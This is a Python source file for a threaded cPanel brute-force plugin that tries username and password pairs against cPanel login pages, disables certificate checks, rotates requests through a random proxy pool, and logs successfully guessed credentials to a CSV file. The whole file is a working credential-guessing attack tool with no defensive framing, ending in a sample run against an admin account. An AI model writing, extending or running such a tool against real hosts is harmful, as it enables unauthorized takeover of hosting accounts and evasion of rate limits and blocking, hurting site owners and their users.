#!/usr/bin/env python
# cpanel_plugin.py v2.9 - 加入 get_proxy 統一代理選擇

import logging
import csv
import requests
import random
from threading import Lock

ERROR_CODES = {
    'NETWORK':               2001,
    'INVALID_CREDENTIALS':   2002,
    'FORM_NOT_FOUND':        2003,
    'HTTP_ERROR':            2004,
}

class FailureReasons:
    NETWORK = "Network/connection error"
    INVALID_CREDENTIALS = "Invalid credentials"
    FORM_NOT_FOUND = "Login form not found"
    @staticmethod
    def http_error(code):
        return f"HTTP {code}"

output_lock = Lock()

class CPanelBruteForcePlugin:
    def __init__(
        self,
        threads=5,
        timeout=10,
        debug=False,
        proxy=None,
        proxy_pool=None,
        logger=None
    ):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.logger = logger or self.setup_logger(debug)
        self.lock = Lock()

    def setup_logger(self, debug_mode):
        logger = logging.getLogger("CPanelBruteForcePlugin")
        logger.setLevel(logging.DEBUG if debug_mode else logging.INFO)
        if logger.hasHandlers():
            logger.handlers.clear()
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(ch)
        return logger

    def get_proxy(self):
        if self.proxy_pool:
            return random.choice(self.proxy_pool)
        return self.proxy

    def attempt_cpanel_login(self, target_url, username, password):
        proxy = self.get_proxy()
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        try:
            response = requests.get(
                target_url,
                auth=(username, password),
                timeout=self.timeout,
                verify=False,
                proxies=proxies
            )
            return (response.status_code == 200 and "cPanel" in response.text), response.status_code, response.text
        except requests.RequestException as e:
            self.logger.debug(f"RequestException: {e}")
            return False, -1, ""

    def process_login(self, target, port, username, password,
                      output_file, failed_log, timeout, retries):
        original_timeout = self.timeout
        self.timeout = timeout

        target_url = target if target.startswith(("http://", "https://")) else f"http://{target}:{port}"

        success = False
        last_code = None
        last_text = ""

        for _ in range(retries):
            success, code, text = self.attempt_cpanel_login(target_url, username, password)
            last_code = code
            last_text = text
            if success:
                break

        status_str = 'Success' if success else 'Failed'

        failure_reason = None
        error_code = None

        if not success:
            if last_code == -1:
                failure_reason = FailureReasons.NETWORK
                error_code = ERROR_CODES['NETWORK']
            elif last_code == 401:
                failure_reason = FailureReasons.INVALID_CREDENTIALS
                error_code = ERROR_CODES['INVALID_CREDENTIALS']
            elif last_code == 200:
                low = last_text.lower()
                if '<form' in low or 'name="user"' in low:
                    failure_reason = FailureReasons.INVALID_CREDENTIALS
                    error_code = ERROR_CODES['INVALID_CREDENTIALS']
                else:
                    failure_reason = FailureReasons.FORM_NOT_FOUND
                    error_code = ERROR_CODES['FORM_NOT_FOUND']
            else:
                failure_reason = FailureReasons.http_error(last_code)
                error_code = ERROR_CODES['HTTP_ERROR']

        parts = [f"{'✅' if success else '❌'} {target_url} - {username}/{password}",
                 f"Status: {status_str}", f"Code: {last_code}"]
        if failure_reason:
            parts.append(f"FailureReason: {failure_reason}")
        if error_code:
            parts.append(f"ErrorCode: {error_code}")
        log_msg = " | ".join(parts)

        print(log_msg)
        (self.logger.info if success else self.logger.warning)(log_msg)

        row_success = {
            "Target": target,
            "Port": port,
            "Username": username,
            "Password": password,
            "Status": status_str,
            "ResponseCode": last_code
        }
        row_failed = {
            "Target": target,
            "Port": port,
            "Username": username,
            "Password": password,
            "ResponseCode": last_code,
            "FailureReason": failure_reason,
            "ErrorCode": error_code
        }

        with output_lock:
            if success:
                with open(output_file, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=[
                        "Target", "Port", "Username", "Password", "Status", "ResponseCode"
                    ])
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow(row_success)
            elif failed_log:
                with open(failed_log, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=[
                        "Target", "Port", "Username", "Password",
                        "ResponseCode", "FailureReason", "ErrorCode"
                    ])
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow(row_failed)

        self.timeout = original_timeout


if __name__ == '__main__':
    plugin = CPanelBruteForcePlugin(proxy_pool=["socks5://127.0.0.1:1080"], debug=True)
    plugin.process_login(
        target="example.com", port=2082, username="admin", password="wrongpass",
        output_file="cpanel_success.csv", failed_log="cpanel_failed.csv",
        timeout=5, retries=1
    )



